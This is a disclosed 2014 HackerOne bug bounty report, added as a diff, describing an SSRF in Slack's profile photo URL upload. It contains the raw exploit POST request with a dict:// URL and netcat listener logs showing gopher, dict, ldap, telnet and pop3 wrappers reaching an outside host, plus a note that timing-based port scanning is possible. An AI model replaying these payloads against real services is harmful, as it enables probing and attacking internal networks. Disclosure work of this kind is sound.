@@ -1,0 +1,63 @@
+ReportLink:https://hackerone.com/reports/14127
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/4lemon
+ReportedTo:Slack(slack)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:21.12.2014 10:03:57
+
+Summary:
+
+During post request to https://whitehataudit.slack.com/account/photo:
+POST /account/photo HTTP/1.1
+Host: whitehataudit.slack.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://whitehataudit.slack.com/account/photo?url=http%3A%2F%2F95.211.198.76:5555%2Fpicture-54679.jpg
+Cookie: _ga=GA1.2.1382862309.1401451625; a-2195611171=aP4kbQ9Y8dnl8ZYuS6SK6ZeF%2FyqCF%2Bt1hOMyzdBzvIbWXqrJ8IyG7%2B8S%2FG%2BOkuw9KDY2I%2BXGkTZ80XFYFYznxQ%3D%3D; a=2195611171
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+
+crumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85
+
+We got an SSRF with NOT port whitelist and with NOT disabled wrappers (see below):
+nc -lvv 6655
+Connection from 184.73.10.28 port 6655 [tcp/*] accepted
+GET /picture-54679.jpg HTTP/1.1
+User-Agent: Slackbot (+https://api.slack.com/robots)
+Host: 95.211.198.76:6655
+Accept: */*
+Accept-Encoding: gzip,deflate
+
+gopher
+nc -lvv 6655
+Connection from 54.197.108.234 port 6655 [tcp/*] accepted
+icture-54679.jpg
+
+
+dict.
+nc -lvv 6655
+Connection from 107.21.158.167 port 6655 [tcp/*] accepted
+CLIENT libcurl 7.22.0
+picture-54679.jpg
+QUIT
+
+ldap
+nc -lvv 6655
+Connection from 54.224.81.147 port 6655 [tcp/*] accepted
+0
+
+telnet
+nc -lvv 6655
+Connection from 54.224.81.147 port 6655 [tcp/*] accepted
+
+pop3
+nc -lvv 6655
+Connection from 50.16.108.10 port 6655 [tcp/*] accepted
+QUIT
+
+It's possible to use it to port scanning (using timing). Good writeup about ssrf vulns: https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit
